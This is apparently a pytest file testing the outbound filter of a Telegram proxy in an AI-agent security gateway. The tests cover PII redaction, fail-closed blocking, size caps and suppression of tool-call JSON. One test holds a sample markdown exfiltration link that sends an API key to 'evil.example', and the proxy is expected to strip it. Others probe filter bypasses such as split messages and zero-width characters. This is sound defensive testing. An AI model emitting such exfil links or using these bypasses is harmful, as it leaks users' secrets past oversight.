"""Tests for TelegramAPIProxy outbound security pipeline integration.

Proves that _filter_outbound() runs the full security pipeline
(PII sanitizer, OutboundInfoFilter, OutputCanary) on all outbound messages.

Created: 2026-03-08 — Fixes C-0 (outbound pipeline bypass)
"""
import json
import asyncio
import io
import urllib.parse
import urllib.error
import urllib.request
import pytest
from types import SimpleNamespace
from gateway.proxy.telegram_proxy import TelegramAPIProxy
from gateway.ingest_api.sanitizer import PIISanitizer
from gateway.ingest_api.config import PIIConfig


def _make_sanitizer():
    """Create a PIISanitizer with default enforce config."""
    config = PIIConfig()
    return PIISanitizer(config, mode="enforce", action="redact")


class TestOutboundPipelineIntegration:
    """Tests that _filter_outbound calls the full security pipeline."""

    @pytest.mark.asyncio
    async def test_pii_redacted_on_outbound(self):
        """Phone numbers in outbound messages must be redacted by PII sanitizer.

        Regression test for the collaborator privacy leak where all 10
        authorized sender phone numbers were exposed unredacted.
        """
        sanitizer = _make_sanitizer()
        proxy = TelegramAPIProxy(sanitizer=sanitizer)

        body = json.dumps({
            "chat_id": "7614658040",
            "text": "The authorized senders are: 8096968754, 8506022825, 8545356403"
        }).encode()

        result = await proxy._filter_outbound(body, "application/json")
        result_data = json.loads(result)

        assert "8096968754" not in result_data["text"], "Phone number leaked through outbound filter"
        assert "8506022825" not in result_data["text"], "Phone number leaked through outbound filter"
        assert "8545356403" not in result_data["text"], "Phone number leaked through outbound filter"

    @pytest.mark.asyncio
    async def test_ssn_redacted_on_outbound(self):
        """SSN in outbound messages must be redacted."""
        sanitizer = _make_sanitizer()
        proxy = TelegramAPIProxy(sanitizer=sanitizer)

        body = json.dumps({
            "chat_id": "12345",
            "text": "Your SSN is 987-65-4321 as requested."
        }).encode()

        result = await proxy._filter_outbound(body, "application/json")
        result_data = json.loads(result)

        assert "987-65-4321" not in result_data["text"], "SSN leaked through outbound filter"

    @pytest.mark.asyncio
    async def test_outbound_pipeline_called_when_available(self):
        """When pipeline is set, process_outbound must be called on outbound messages."""
        pipeline_called = False

        class MockPipeline:
            async def process_outbound(self, response, **kwargs):
                nonlocal pipeline_called
                pipeline_called = True
                from dataclasses import dataclass
                @dataclass
                class Result:
                    blocked = False
                    sanitized_message = response
                    block_reason = ""
                return Result()

        sanitizer = _make_sanitizer()
        proxy = TelegramAPIProxy(pipeline=MockPipeline(), sanitizer=sanitizer)

        body = json.dumps({
            "chat_id": "12345",
            "text": "Hello world"
        }).encode()

        await proxy._filter_outbound(body, "application/json")
        assert pipeline_called, "Pipeline.process_outbound must be called for outbound messages"

    @pytest.mark.asyncio
    async def test_outbound_fails_closed_for_non_owner(self):
        """If pipeline crashes, non-owner messages must be blocked."""
        class CrashingPipeline:
            async def process_outbound(self, response, **kwargs):
                raise RuntimeError("Intentional crash")

        sanitizer = _make_sanitizer()
        proxy = TelegramAPIProxy(pipeline=CrashingPipeline(), sanitizer=sanitizer)

        class MockRBAC:
            owner_user_id = "9999999999"
        proxy._rbac = MockRBAC()

        body = json.dumps({
            "chat_id": "7614658040",
            "text": "Some response with secrets"
        }).encode()

        result = await proxy._filter_outbound(body, "application/json")
        result_data = json.loads(result)

        assert "security pipeline" in result_data["text"].lower(),             "Non-owner messages must be blocked when pipeline crashes"
        assert "Some response with secrets" not in result_data["text"],             "Original content must not leak through on pipeline crash"

    @pytest.mark.asyncio
    async def test_outbound_owner_exempt_from_fail_closed(self):
        """If pipeline crashes, owner messages should still go through."""
        class CrashingPipeline:
            async def process_outbound(self, response, **kwargs):
                raise RuntimeError("Intentional crash")

        sanitizer = _make_sanitizer()
        proxy = TelegramAPIProxy(pipeline=CrashingPipeline(), sanitizer=sanitizer)

        class MockRBAC:
            owner_user_id = "8096968754"
        proxy._rbac = MockRBAC()

        body = json.dumps({
            "chat_id": "8096968754",
            "text": "Owner response should pass through"
        }).encode()

        result = await proxy._filter_outbound(body, "application/json")
        result_data = json.loads(result)

        assert "security pipeline" not in result_data["text"].lower(),             "Owner messages should not be blocked on pipeline crash"

    @pytest.mark.asyncio
    async def test_long_outbound_message_blocked_for_non_owner(self):
        """Messages above hard size cap should be blocked to prevent split bypass."""
        sanitizer = _make_sanitizer()
        proxy = TelegramAPIProxy(sanitizer=sanitizer)
        proxy._max_outbound_chars = 32

        body = json.dumps({
            "chat_id": "7614658040",
            "text": "A" * 100
        }).encode()

        result = await proxy._filter_outbound(body, "application/json")
        result_data = json.loads(result)
        assert "blocked by security policy" in result_data["text"].lower()

    @pytest.mark.asyncio
    async def test_long_outbound_message_quarantined(self, monkeypatch):
        """Blocked outbound messages should be stored in outbound quarantine."""
        from gateway.ingest_api import state as state_module

        quarantine = []
        monkeypatch.setattr(
            state_module,
            "app_state",
            SimpleNamespace(blocked_outbound_quarantine=quarantine),
        )

        sanitizer = _make_sanitizer()
        proxy = TelegramAPIProxy(sanitizer=sanitizer)
        proxy._max_outbound_chars = 10
        body = json.dumps({"chat_id": "7614658040", "text": "X" * 50}).encode()
        _ = await proxy._filter_outbound(body, "application/json")
        assert len(quarantine) == 1
        assert quarantine[0]["status"] == "pending"
        assert "message_id" in quarantine[0]

    @pytest.mark.asyncio
    async def test_info_filter_redaction_escalates_to_block_for_non_owner(self):
        """Any outbound info-filter redaction should be blocked for collaborators."""
        class InfoFilterPipeline:
            async def process_outbound(self, response, **kwargs):
                return SimpleNamespace(
                    blocked=False,
                    sanitized_message="redacted text",
                    block_reason="",
                    info_filter_redaction_count=2,
                )

        sanitizer = _make_sanitizer()
        proxy = TelegramAPIProxy(pipeline=InfoFilterPipeline(), sanitizer=sanitizer)

        body = json.dumps({
            "chat_id": "7614658040",
            "text": "sensitive runtime details",
        }).encode()

        result = await proxy._filter_outbound(body, "application/json")
        result_data = json.loads(result)
        assert "blocked by security policy" in result_data["text"].lower()

    @pytest.mark.asyncio
    async def test_block_cascade_blocks_followup_fragment(self):
        """A blocked fragment should cascade-block immediate follow-up chunks."""
        sanitizer = _make_sanitizer()
        proxy = TelegramAPIProxy(sanitizer=sanitizer)
        proxy._max_outbound_chars = 8
        chat_id = "7614658040"

        # First chunk triggers over-length block and starts cascade window.
        first = json.dumps({"chat_id": chat_id, "text": "X" * 20}).encode()
        first_result = json.loads(await proxy._filter_outbound(first, "application/json"))
        assert "blocked by security policy" in first_result["text"].lower()

        # Second small chunk should still be blocked during cascade window.
        second = json.dumps({"chat_id": chat_id, "text": "ok"}).encode()
        second_result = json.loads(await proxy._filter_outbound(second, "application/json"))
        assert "blocked by security policy" in second_result["text"].lower()

    @pytest.mark.asyncio
    async def test_markdown_exfil_link_scrubbed(self):
        """Outbound markdown exfil links should be stripped before delivery."""
        sanitizer = _make_sanitizer()
        proxy = TelegramAPIProxy(sanitizer=sanitizer)
        body = json.dumps(
            {
                "chat_id": "7614658040",
                "text": "[click](https://evil.example/exfil?key={{API_KEY}})",
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "evil.example" not in result["text"]
        assert "Link removed" in result["text"]

    @pytest.mark.asyncio
    async def test_pipeline_receives_trust_level(self):
        """Proxy should pass owner/non-owner trust level into outbound pipeline."""
        seen = {}

        class CapturingPipeline:
            async def process_outbound(self, response, **kwargs):
                seen.update(kwargs)
                return SimpleNamespace(
                    blocked=False,
                    sanitized_message=response,
                    block_reason="",
                    info_filter_redaction_count=0,
                )

        sanitizer = _make_sanitizer()
        proxy = TelegramAPIProxy(pipeline=CapturingPipeline(), sanitizer=sanitizer)
        body = json.dumps({"chat_id": "7614658040", "text": "hello"}).encode()
        await proxy._filter_outbound(body, "application/json")
        assert seen.get("user_trust_level") == "UNTRUSTED"

    @pytest.mark.asyncio
    async def test_raw_tool_call_json_never_leaks(self):
        """Raw tool-call JSON blobs must be suppressed before Telegram delivery."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "7614658040",
                "text": "{\"name\": \"sessions_spawn\", \"arguments\": {\"agentId\": \"acp.healthcheck\"}}",
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "sessions_spawn" not in result["text"]
        assert "healthcheck started" in result["text"].lower()

    @pytest.mark.asyncio
    async def test_raw_tool_call_json_with_zero_width_chars_is_suppressed(self):
        """Obfuscated tool-call JSON should still be normalized and suppressed."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "7614658040",
                "text": "{\"\u200bname\": \"sessions_spawn\", \"arguments\": {\"agentId\": \"acp.healthcheck\"}}",
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "sessions_spawn" not in result["text"]
        assert "healthcheck started" in result["text"].lower()

    @pytest.mark.asyncio
    async def test_no_reply_tool_token_is_rewritten_to_wait_message(self):
        """NO_REPLY tool JSON should be converted into a user-safe wait message."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": "{\"name\": \"NO_REPLY\", \"arguments\": {}}",
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "still processing" in result["text"].lower()

    @pytest.mark.asyncio
    async def test_healthcheck_sessions_spawn_json_is_rewritten(self):
        """Healthcheck tool-call JSON should be rewritten to friendly status text."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": "{\"name\":\"sessions_spawn\",\"arguments\":{\"agentId\":\"acp.healthcheck\",\"task\":\"x\"}}",
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "healthcheck started" in result["text"].lower()

    @pytest.mark.asyncio
    async def test_generic_sessions_spawn_json_is_rewritten(self):
        """Generic session spawn JSON should be rewritten, not shown raw."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": "{\"name\":\"sessions_spawn\",\"arguments\":{\"agentId\":\"acp.any\"}}",
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "queued" in result["text"].lower()
        assert "sessions_spawn" not in result["text"]

    @pytest.mark.asyncio
    async def test_session_lock_error_is_sanitized_for_users(self):
        """Internal session lock errors should be rewritten to safe user guidance."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": "⚠️ Agent failed before reply: session file locked (timeout 10000ms): pid=265 /home/node/.agentshroud/...",
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "session file locked" not in result["text"].lower()
        assert "previous request" in result["text"].lower()

    @pytest.mark.asyncio
    async def test_ollama_tools_unsupported_error_is_sanitized(self):
        """Raw model capability errors should be rewritten to actionable guidance."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": "Ollama API error 400: {\"error\":\"model does not support tools\"}",
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "does not support tool" in result["text"].lower()
        assert "switch_model.sh" in result["text"]
        assert "ollama api error" not in result["text"].lower()

    @pytest.mark.asyncio
    async def test_unknown_model_error_is_sanitized(self):
        """Unknown model errors should be rewritten without leaking raw stack text."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": "⚠️ Agent failed before reply: Unknown model: ollama/qwen2.5-coder:7b",
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "unknown model:" not in result["text"].lower()
        assert "switch_model.sh" in result["text"]

    @pytest.mark.asyncio
    async def test_ollama_auth_required_error_is_sanitized(self):
        """Ollama auth errors should map to concise operator guidance."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": (
                    "Unknown model: ollama/qwen2.5-coder:7b. "
                    "Ollama requires authentication to be registered as a provider."
                ),
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "requires authentication" not in result["text"].lower()
        assert "ollama-local" in result["text"]

    @pytest.mark.asyncio
    async def test_urlencoded_draft_payload_tool_json_is_rewritten(self):
        """Form-encoded draft payloads must not leak raw tool-call JSON."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        raw_text = '{"name":"sessions_spawn","arguments":{"agentId":"acp.healthcheck"}}'
        body = urllib.parse.urlencode({"chat_id": "8096968754", "text": raw_text}).encode()
        result = await proxy._filter_outbound(body, "application/x-www-form-urlencoded")
        parsed = dict(urllib.parse.parse_qsl(result.decode(), keep_blank_values=True))
        assert "sessions_spawn" not in parsed.get("text", "")
        assert "healthcheck started" in parsed.get("text", "").lower()

    @pytest.mark.asyncio
    async def test_json_without_content_type_is_still_filtered(self):
        """Missing content-type must not bypass outbound JSON leak filtering."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": "{\"name\":\"NO_REPLY\",\"arguments\":{}}",
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, None))
        assert "still processing" in result["text"].lower()

    @pytest.mark.asyncio
    async def test_urlencoded_without_content_type_draft_is_still_filtered(self):
        """Missing content-type must not bypass form draft leak filtering."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = urllib.parse.urlencode(
            {
                "chat_id": "8096968754",
                "draft": "{\"name\":\"NO_REPLY\",\"arguments\":{}}",
            }
        ).encode()
        result = await proxy._filter_outbound(body, None)
        parsed = dict(urllib.parse.parse_qsl(result.decode(), keep_blank_values=True))
        assert "still processing" in parsed.get("draft", "").lower()

    @pytest.mark.asyncio
    async def test_urlencoded_without_content_type_caption_is_still_filtered(self):
        """Missing content-type must not bypass form caption leak filtering."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = urllib.parse.urlencode(
            {
                "chat_id": "8096968754",
                "caption": "{\"name\":\"sessions_spawn\",\"arguments\":{\"agentId\":\"acp.healthcheck\"}}",
            }
        ).encode()
        result = await proxy._filter_outbound(body, None)
        parsed = dict(urllib.parse.parse_qsl(result.decode(), keep_blank_values=True))
        assert "healthcheck started" in parsed.get("caption", "").lower()
        assert "sessions_spawn" not in parsed.get("caption", "")

    @pytest.mark.asyncio
    async def test_html_parse_mode_removed_for_redaction_placeholders(self):
        """HTML parse mode should be dropped for redaction placeholder tokens."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "7614658040",
                "text": "Contact: <EMAIL_ADDRESS>",
                "parse_mode": "HTML",
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "parse_mode" not in result
        assert "<EMAIL_ADDRESS>" in result["text"]

    @pytest.mark.asyncio
    async def test_html_parse_mode_preserved_without_redaction_placeholders(self):
        """Normal HTML formatting should preserve parse_mode."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "7614658040",
                "text": "<b>Status</b>: OK",
                "parse_mode": "HTML",
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert result.get("parse_mode") == "HTML"

    @pytest.mark.asyncio
    async def test_proxy_request_sends_no_reply_wait_message_once(self, monkeypatch):
        """First NO_REPLY payload should send safe wait guidance to Telegram."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        calls = {"count": 0, "last_body": b""}

        async def _mock_forward(_url, body, _content_type):
            calls["count"] += 1
            calls["last_body"] = body
            return {"ok": True, "result": {"message_id": calls["count"]}}

        monkeypatch.setattr(proxy, "_forward_to_telegram", _mock_forward)

        body = json.dumps(
            {"chat_id": "8096968754", "text": "{\"name\":\"NO_REPLY\",\"arguments\":{}}"}
        ).encode()
        result = await proxy.proxy_request(
            bot_token="dummy",
            method="sendMessage",
            body=body,
            content_type="application/json",
        )
        assert result["ok"] is True
        assert calls["count"] == 1
        forwarded = json.loads(calls["last_body"])
        assert "still processing" in forwarded.get("text", "").lower()

    @pytest.mark.asyncio
    async def test_proxy_request_suppresses_duplicate_no_reply_messages(self, monkeypatch):
        """Repeated NO_REPLY payloads in cooldown window should be suppressed."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        calls = {"count": 0}

        async def _mock_forward(*_args, **_kwargs):
            calls["count"] += 1
            return {"ok": True, "result": {"message_id": calls["count"]}}

        monkeypatch.setattr(proxy, "_forward_to_telegram", _mock_forward)

        body = json.dumps(
            {"chat_id": "8096968754", "text": "{\"name\":\"NO_REPLY\",\"arguments\":{}}"}
        ).encode()
        first = await proxy.proxy_request(
            bot_token="dummy",
            method="sendMessage",
            body=body,
            content_type="application/json",
        )
        second = await proxy.proxy_request(
            bot_token="dummy",
            method="sendMessage",
            body=body,
            content_type="application/json",
        )
        assert first.get("ok") is True
        assert second.get("ok") is True
        assert second.get("result", {}).get("suppressed") is True
        assert calls["count"] == 1

    @pytest.mark.asyncio
    async def test_proxy_request_suppresses_duplicate_system_startup_notice(self, monkeypatch):
        """System startup notice should be deduplicated in a short cooldown window."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        calls = {"count": 0}

        async def _mock_forward(*_args, **_kwargs):
            calls["count"] += 1
            return {"ok": True, "result": {"message_id": calls["count"]}}

        monkeypatch.setattr(proxy, "_forward_to_telegram", _mock_forward)

        body = json.dumps({"chat_id": "8096968754", "text": "🛡️ AgentShroud online"}).encode()
        first = await proxy.proxy_request(
            bot_token="dummy",
            method="sendMessage",
            body=body,
            content_type="application/json",
            is_system=True,
        )
        second = await proxy.proxy_request(
            bot_token="dummy",
            method="sendMessage",
            body=body,
            content_type="application/json",
            is_system=True,
        )

        assert first.get("ok") is True
        assert second.get("ok") is True
        assert second.get("result", {}).get("suppressed") is True
        assert calls["count"] == 1

    @pytest.mark.asyncio
    async def test_proxy_request_suppresses_duplicate_startup_notice_without_system_flag(self, monkeypatch):
        """Startup notice dedupe should still apply when sender forgets system header."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        calls = {"count": 0}

        async def _mock_forward(*_args, **_kwargs):
            calls["count"] += 1
            return {"ok": True, "result": {"message_id": calls["count"]}}

        monkeypatch.setattr(proxy, "_forward_to_telegram", _mock_forward)

        body = json.dumps({"chat_id": "8096968754", "text": "🛡️ AgentShroud online"}).encode()
        first = await proxy.proxy_request(
            bot_token="dummy",
            method="sendMessage",
            body=body,
            content_type="application/json",
            is_system=False,
        )
        second = await proxy.proxy_request(
            bot_token="dummy",
            method="sendMessage",
            body=body,
            content_type="application/json",
            is_system=False,
        )

        assert first.get("ok") is True
        assert second.get("ok") is True
        assert second.get("result", {}).get("suppressed") is True
        assert calls["count"] == 1

    @pytest.mark.asyncio
    async def test_proxy_request_allows_distinct_system_notices(self, monkeypatch):
        """Different system notices should both be forwarded."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        calls = {"count": 0}

        async def _mock_forward(*_args, **_kwargs):
            calls["count"] += 1
            return {"ok": True, "result": {"message_id": calls["count"]}}

        monkeypatch.setattr(proxy, "_forward_to_telegram", _mock_forward)

        online = json.dumps({"chat_id": "8096968754", "text": "🛡️ AgentShroud online"}).encode()
        shutdown = json.dumps({"chat_id": "8096968754", "text": "🔴 AgentShroud shutting down"}).encode()

        first = await proxy.proxy_request(
            bot_token="dummy",
            method="sendMessage",
            body=online,
            content_type="application/json",
            is_system=True,
        )
        second = await proxy.proxy_request(
            bot_token="dummy",
            method="sendMessage",
            body=shutdown,
            content_type="application/json",
            is_system=True,
        )

        assert first.get("ok") is True
        assert second.get("ok") is True
        assert second.get("result", {}).get("suppressed") is not True
        assert calls["count"] == 2

    @pytest.mark.asyncio
    async def test_proxy_request_suppresses_startup_notice_emoji_variants(self, monkeypatch):
        """Startup notice dedupe should tolerate emoji variation drift."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        calls = {"count": 0}

        async def _mock_forward(*_args, **_kwargs):
            calls["count"] += 1
            return {"ok": True, "result": {"message_id": calls["count"]}}

        monkeypatch.setattr(proxy, "_forward_to_telegram", _mock_forward)

        first_body = json.dumps({"chat_id": "8096968754", "text": "🛡️ AgentShroud online"}).encode()
        second_body = json.dumps({"chat_id": "8096968754", "text": "🛡 AgentShroud online"}).encode()

        first = await proxy.proxy_request(
            bot_token="dummy",
            method="sendMessage",
            body=first_body,
            content_type="application/json",
            is_system=True,
        )
        second = await proxy.proxy_request(
            bot_token="dummy",
            method="sendMessage",
            body=second_body,
            content_type="application/json",
            is_system=True,
        )

        assert first.get("ok") is True
        assert second.get("ok") is True
        assert second.get("result", {}).get("suppressed") is True
        assert calls["count"] == 1

    @pytest.mark.asyncio
    async def test_form_payload_with_draft_field_is_filtered(self):
        """Form payload using draft field should still suppress tool-call JSON."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        raw_text = '{"name":"sessions_spawn","arguments":{"agentId":"acp.healthcheck"}}'
        body = urllib.parse.urlencode({"chat_id": "8096968754", "draft": raw_text}).encode()
        result = await proxy._filter_outbound(body, "application/x-www-form-urlencoded")
        parsed = dict(urllib.parse.parse_qsl(result.decode(), keep_blank_values=True))
        assert "sessions_spawn" not in parsed.get("draft", "")
        assert "healthcheck started" in parsed.get("draft", "").lower()

    @pytest.mark.asyncio
    async def test_embedded_tool_call_json_is_removed_from_text(self):
        """If tool-call JSON is embedded in prose, strip JSON block before delivery."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": (
                    "please check weather for pittsburgh\n\n"
                    '{"name": "web_fetch", "arguments": {"url": "https://weather.com"}}'
                ),
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "web_fetch" not in result["text"]
        assert "arguments" not in result["text"]
        assert "please check weather" in result["text"].lower()

    @pytest.mark.asyncio
    async def test_embedded_web_fetch_json_queues_approval_when_available(self, monkeypatch):
        """Embedded web_fetch JSON should still queue interactive egress approval."""
        called = {"value": False}

        class FakeEgress:
            async def check_async(self, **kwargs):
                called["value"] = True
                called["kwargs"] = kwargs
                return SimpleNamespace(action="deny")

        from gateway.ingest_api import state as state_module

        monkeypatch.setattr(
            state_module,
            "app_state",
            SimpleNamespace(egress_filter=FakeEgress()),
        )
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": (
                    "please check weather for pittsburgh\n\n"
                    '{"name":"web_fetch","arguments":{"url":"https://weather.com/weather/today"}}'
                ),
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        await asyncio.sleep(0)
        assert called["value"] is True
        assert called["kwargs"]["tool_name"] == "web_fetch"
        assert "approval request queued" in result["text"].lower()
        assert "web_fetch" not in result["text"]

    @pytest.mark.asyncio
    async def test_raw_web_fetch_json_is_rewritten_to_actionable_guidance(self):
        """Pure web_fetch tool-call JSON should be rewritten to user guidance."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": "{\"name\":\"web_fetch\",\"arguments\":{\"url\":\"https://weather.com\"}}",
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "raw tool json" in result["text"].lower()
        assert "switch_model.sh" in result["text"]

    @pytest.mark.asyncio
    async def test_raw_web_fetch_json_queues_egress_approval_when_available(self, monkeypatch):
        """Raw web_fetch JSON should queue interactive egress approval for the destination."""
        called = {"value": False}

        class FakeEgress:
            async def check_async(self, **kwargs):
                called["value"] = True
                called["kwargs"] = kwargs
                return SimpleNamespace(action="deny")

        from gateway.ingest_api import state as state_module

        monkeypatch.setattr(
            state_module,
            "app_state",
            SimpleNamespace(egress_filter=FakeEgress()),
        )
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": "{\"name\":\"web_fetch\",\"arguments\":{\"url\":\"https://weather.com/weather/today\"}}",
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        await asyncio.sleep(0)
        assert called["value"] is True
        assert called["kwargs"]["tool_name"] == "web_fetch"
        assert called["kwargs"]["agent_id"] == "telegram_web_fetch:8096968754"
        assert "approval request queued" in result["text"].lower()

    @pytest.mark.asyncio
    async def test_raw_web_fetch_json_approval_queue_is_cooldown_deduped(self, monkeypatch):
        """Repeated identical web_fetch leaks should not spam approval queue."""
        calls = {"count": 0}

        class FakeEgress:
            async def check_async(self, **_kwargs):
                calls["count"] += 1
                return SimpleNamespace(action="deny")

        from gateway.ingest_api import state as state_module

        monkeypatch.setattr(
            state_module,
            "app_state",
            SimpleNamespace(egress_filter=FakeEgress()),
        )

        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        proxy._web_fetch_approval_cooldown_seconds = 600.0
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": "{\"name\":\"web_fetch\",\"arguments\":{\"url\":\"https://weather.com/weather/today\"}}",
            }
        ).encode()

        first = json.loads(await proxy._filter_outbound(body, "application/json"))
        second = json.loads(await proxy._filter_outbound(body, "application/json"))
        await asyncio.sleep(0)

        assert calls["count"] == 1
        assert "approval request queued" in first["text"].lower()
        assert "approval request queued" not in second["text"].lower()

    @pytest.mark.asyncio
    async def test_raw_web_fetch_json_approval_normalizes_leading_dot_domain(self, monkeypatch):
        """Malformed host with leading dot should still queue approval for normalized domain."""
        called = {"value": False}

        class FakeEgress:
            async def check_async(self, **kwargs):
                called["value"] = True
                called["kwargs"] = kwargs
                return SimpleNamespace(action="deny")

        from gateway.ingest_api import state as state_module

        monkeypatch.setattr(
            state_module,
            "app_state",
            SimpleNamespace(egress_filter=FakeEgress()),
        )
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": "{\"name\":\"web_fetch\",\"arguments\":{\"url\":\"https://.waether.com/weather/today\"}}",
            }
        ).encode()

        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        await asyncio.sleep(0)

        assert called["value"] is True
        assert called["kwargs"]["destination"] == "https://waether.com"
        assert "approval request queued" in result["text"].lower()

    @pytest.mark.asyncio
    async def test_raw_web_fetch_json_approval_strips_trailing_punctuation(self, monkeypatch):
        """Trailing punctuation in leaked URL should be normalized before approval check."""
        called = {"value": False}

        class FakeEgress:
            async def check_async(self, **kwargs):
                called["value"] = True
                called["kwargs"] = kwargs
                return SimpleNamespace(action="deny")

        from gateway.ingest_api import state as state_module

        monkeypatch.setattr(
            state_module,
            "app_state",
            SimpleNamespace(egress_filter=FakeEgress()),
        )
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": "{\"name\":\"web_fetch\",\"arguments\":{\"url\":\"https://accuweather.com)\"}}",
            }
        ).encode()

        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        await asyncio.sleep(0)

        assert called["value"] is True
        assert called["kwargs"]["destination"] == "https://accuweather.com"
        assert "approval request queued" in result["text"].lower()

    @pytest.mark.asyncio
    async def test_raw_web_fetch_json_invalid_host_does_not_queue_approval(self, monkeypatch):
        """Non-domain hosts should not queue egress approval requests."""
        calls = {"count": 0}

        class FakeEgress:
            async def check_async(self, **_kwargs):
                calls["count"] += 1
                return SimpleNamespace(action="deny")

        from gateway.ingest_api import state as state_module

        monkeypatch.setattr(
            state_module,
            "app_state",
            SimpleNamespace(egress_filter=FakeEgress()),
        )
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": "{\"name\":\"web_fetch\",\"arguments\":{\"url\":\"https://localhost\"}}",
            }
        ).encode()

        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        await asyncio.sleep(0)

        assert calls["count"] == 0
        assert "approval request queued" not in result["text"].lower()

    @pytest.mark.asyncio
    async def test_raw_web_fetch_json_ip_host_does_not_queue_approval(self, monkeypatch):
        """Literal IP targets should not enter interactive domain approval flow."""
        calls = {"count": 0}

        class FakeEgress:
            async def check_async(self, **_kwargs):
                calls["count"] += 1
                return SimpleNamespace(action="deny")

        from gateway.ingest_api import state as state_module

        monkeypatch.setattr(
            state_module,
            "app_state",
            SimpleNamespace(egress_filter=FakeEgress()),
        )
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": "{\"name\":\"web_fetch\",\"arguments\":{\"url\":\"http://127.0.0.1:8080\"}}",
            }
        ).encode()

        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        await asyncio.sleep(0)

        assert calls["count"] == 0
        assert "approval request queued" not in result["text"].lower()

    @pytest.mark.asyncio
    async def test_raw_web_fetch_json_malformed_hyphen_domain_does_not_queue_approval(self, monkeypatch):
        """Malformed domain labels should be rejected before approval queueing."""
        calls = {"count": 0}

        class FakeEgress:
            async def check_async(self, **_kwargs):
                calls["count"] += 1
                return SimpleNamespace(action="deny")

        from gateway.ingest_api import state as state_module

        monkeypatch.setattr(
            state_module,
            "app_state",
            SimpleNamespace(egress_filter=FakeEgress()),
        )
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": "{\"name\":\"web_fetch\",\"arguments\":{\"url\":\"https://-bad.example.com\"}}",
            }
        ).encode()

        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        await asyncio.sleep(0)

        assert calls["count"] == 0
        assert "approval request queued" not in result["text"].lower()

    @pytest.mark.asyncio
